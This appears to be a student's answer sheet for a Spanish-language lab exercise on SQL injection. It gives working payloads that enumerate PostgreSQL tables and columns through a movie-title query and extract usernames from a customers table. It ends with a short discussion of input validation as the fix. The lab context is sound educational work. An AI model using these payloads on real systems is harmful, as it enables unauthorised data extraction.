b)

1';SELECT tablename as movietitle
FROM pg_tables--'

c)
1';SELECT tablename as movietitle
FROM pg_tables
WHERE schemaname='public';--'

d)
customers parece la más cercana

e)
1';SELECT oid as movietitle
FROM pg_class
WHERE relname = (SELECT tablename as movietitle
FROM pg_tables
WHERE schemaname='public' and (tablename LIKE '%%client%%' or tablename LIKE '%%customer%%') LIMIT 1);--'

f)
1';SELECT attname as movietitle
FROM pg_attribute
WHERE attrelid = (SELECT oid
FROM pg_class
WHERE relname = (SELECT tablename as movietitle
FROM pg_tables
WHERE schemaname='public' and (tablename LIKE '%%client%%' or tablename LIKE '%%customer%%') LIMIT 1));--'

g)
username parece la más cercana

h)
1';SELECT username as movietitle
FROM customers;--'

i)
Una de las maneras más factibles sería restringir los valores para ese campo a únicamente números (ya que los años nunca llevarían letras).
Si se establece un combobox no sería tan útil, ya que se siguen pudiendo realizar peticiones al servidor (ya que los argumentos llegan como parámetros en la URL)
e incluso se podrían usar aplicaciones estilo Postman para realizar estas peticiones. Para el caso de POST o GET, sucede algo parecido. Se pueden realizar peticiones POST
con aplicaciones externas con las cuales podría haber injections.